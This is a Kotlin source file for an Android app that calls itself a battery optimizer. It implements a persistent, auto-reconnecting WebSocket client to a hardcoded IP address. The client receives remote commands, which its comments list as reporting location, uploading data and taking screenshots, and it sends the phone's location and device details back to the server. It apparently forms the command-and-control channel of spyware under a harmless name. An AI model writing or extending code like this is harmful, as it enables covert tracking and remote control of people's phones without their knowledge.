package com.android.batteryoptimization.network

import android.annotation.SuppressLint
import android.content.Context
import android.util.Log
import com.android.batteryoptimization.AMapLocationHelper
import com.android.batteryoptimization.DeviceInfoHelper
import com.google.gson.Gson
import com.google.gson.JsonObject
import okhttp3.*
import java.util.Timer
import java.util.TimerTask
import java.util.concurrent.TimeUnit

/**
 * WebSocket 管理器 — 与服务器保持长连接，接收下行指令。
 *
 * 功能：
 *  - 自动连接 / 断线重连
 *  - 心跳保活（30s 间隔）
 *  - 指令分发（report_location / upload_data / take_screenshot 等）
 */
@SuppressLint("StaticFieldLeak")
object WebSocketManager {

    private const val TAG = "WebSocket"
    private const val WS_URL = "ws://47.93.162.24/ws"
    private const val HEARTBEAT_INTERVAL_MS = 15000L  // 15s 发一次心跳（服务器超时 30s）
    private const val RECONNECT_DELAY_MS = 5000L

    private val gson = Gson()
    private var webSocket: WebSocket? = null
    private var httpClient: OkHttpClient? = null
    private var contextRef: Context? = null
    private var isActive = false
    private var heartbeatJob: Timer? = null

    /**
     * 外部设置的回调 — 收到指令时触发。
     * @param command 指令名
     * @param data 服务器下发的 data 字段（可能是 JsonObject 或 JsonPrimitive 字符串，或 null）
     */
    var onCommand: ((command: String, data: Any?) -> Unit)? = null

    // ─── 生命周期 ─────────────────────────────────────────────────────

    fun start(context: Context) {
        if (isActive) return
        isActive = true
        contextRef = context.applicationContext
        Log.d(TAG, "WebSocket starting...")
        connect()
    }

    fun stop() {
        isActive = false
        stopHeartbeat()
        webSocket?.close(1000, "Client closing")
        webSocket = null
        Log.d(TAG, "WebSocket stopped")
    }

    fun send(data: String): Boolean {
        return webSocket?.send(data) ?: false
    }

    // ─── 连接 ─────────────────────────────────────────────────────────

    private fun connect() {
        if (!isActive) return

        val client = httpClient ?: OkHttpClient.Builder()
            .connectTimeout(10, TimeUnit.SECONDS)
            .readTimeout(60, TimeUnit.SECONDS)
            .writeTimeout(30, TimeUnit.SECONDS)
            .build()
            .also { httpClient = it }

        val request = Request.Builder()
            .url(WS_URL)
            .build()

        client.newWebSocket(request, object : WebSocketListener() {
            override fun onOpen(webSocket: WebSocket, response: Response) {
                WebSocketManager.webSocket = webSocket
                Log.d(TAG, "WebSocket connected")
                // 连接成功 → 上报设备信息（服务器要求的 client_info）
//                sendClientInfo()
                startHeartbeat()
            }

            override fun onMessage(webSocket: WebSocket, text: String) {
                handleMessage(text)
            }

            override fun onClosing(webSocket: WebSocket, code: Int, reason: String) {
                Log.d(TAG, "WebSocket closing: $code $reason")
            }

            override fun onClosed(webSocket: WebSocket, code: Int, reason: String) {
                WebSocketManager.webSocket = null
                Log.d(TAG, "WebSocket closed: $code $reason")
                scheduleReconnect()
            }

            override fun onFailure(webSocket: WebSocket, t: Throwable, response: Response?) {
                Log.e(TAG, "WebSocket failure: ${t.message}", t)
                WebSocketManager.webSocket = null
                scheduleReconnect()
            }
        })
    }

    // ─── 消息处理（与服务器协议一致） ────────────────────────────────

    private fun handleMessage(text: String) {
        try {
            val json = gson.fromJson(text, JsonObject::class.java) ?: return
            val command = json.get("command")?.asString ?: return

            // data 可能是对象、字符串或 null
            val data: Any? = when (val d = json.get("data")) {
                null -> null
                else -> {
                    try { d.asJsonObject }    // 尝试当对象解析
                    catch (_: Exception) {
                        try { d.asString }    // 否则当字符串
                        catch (_: Exception) { d.toString() }
                    }
                }
            }

            when (command) {
                "heartbeat" -> {
                    if (data == "pong") {
                        Log.v(TAG, "Heartbeat pong received")
                    }
                }
                "amap_config" -> {
                    val obj = data as? JsonObject
                    val sdkKey = obj?.get("sdkKey")?.asString ?: ""
//                    val secretKey = obj?.get("secretKey")?.asString ?: ""
                    Log.d(TAG, "AMap config received: sdkKey=$sdkKey")
                    AMapLocationHelper.initConfig(sdkKey)
//                    onAmapConfig?.invoke(sdkKey, secretKey)
                }
                "error" -> {
                    Log.w(TAG, "Server error: $data")
                }
                else -> {
                    Log.d(TAG, "Command received: $command data=$data")
                    onCommand?.invoke(command, data)
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to parse message: $text", e)
        }
    }

    /** 高德 SDK 配置回调（外部设置） */
    var onAmapConfig: ((sdkKey: String, secretKey: String) -> Unit)? = null

    // ─── 心跳（与服务器协议一致） ───────────────────────────────────

    private fun startHeartbeat() {
        stopHeartbeat()
        heartbeatJob = Timer(true)
        heartbeatJob?.schedule(object : TimerTask() {
            override fun run() {
                if (isActive) {
                    val sent = send("""{"command":"heartbeat","params":"ping"}""")
                    Log.v(TAG, "Heartbeat sent=$sent")
                }
            }
        }, HEARTBEAT_INTERVAL_MS, HEARTBEAT_INTERVAL_MS)
    }

    private fun stopHeartbeat() {
        heartbeatJob?.cancel()
        heartbeatJob = null
    }

    private fun scheduleReconnect() {
        if (!isActive) return
        Log.d(TAG, "Scheduling reconnect in ${RECONNECT_DELAY_MS}ms")
        android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
            if (isActive) connect()
        }, RECONNECT_DELAY_MS)
    }

    // ─── 发送方法 ─────────────────────────────────────────────────────

    /** 连接成功后上报设备信息（服务器要求的 client_info） */
    private fun sendClientInfo() {
        val ctx = contextRef ?: return
        val deviceInfo = DeviceInfoHelper.getDeviceInfoJson(ctx)

        val payload = """
            {"command":"client_info","params":{
                "deviceType":"Android",
                "userId":"",
                "deviceInfo":$deviceInfo
            }}
        """.trimIndent().replace("\n", "")
        send(payload)
    }

    /** 主动上报地理位置 */
    fun sendLocation(locationMap: Map<String, Any>) {
        val payload = gson.toJson(locationMap)
        send("""{"command":"report_location","params":$payload}""")
    }

    /** 主动上报设备信息 */
    fun sendDeviceInfo(context: Context) {
        val info = DeviceInfoHelper.getDeviceInfoJson(context)
        send("""{"command":"client_info","params":$info}""")
    }
}
